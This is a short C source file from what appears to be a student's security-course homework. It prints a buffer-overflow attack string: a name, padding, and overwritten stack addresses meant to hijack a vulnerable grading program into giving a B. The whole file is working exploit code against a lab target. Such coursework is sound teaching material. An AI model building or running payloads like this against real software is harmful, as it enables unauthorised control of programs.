// Jennifer Long
// rz5sc
// CS 4630 HW 7
// attack-gradeB.c

#include <stdio.h>
#include <string.h>

// attackString is comprised of the following, in order:
// char name[] = "Jennifer Long\x00";
// char filler[] = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
// char savedParams[] = "\x28\xde\xff\xff\xd5\x85\x04\x08\x80\xa0\x04\x08";
char attackString[] = "Jennifer Long\x00XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\x28\xde\xff\xff\xd5\x85\x04\x08\x80\xa0\x04\x08";

int main() {
 int i;
 char *p = attackString;
 for (i = 0; i < sizeof(attackString); i++) {
   putchar(*p);
   p++;
 }
 return 1;
}
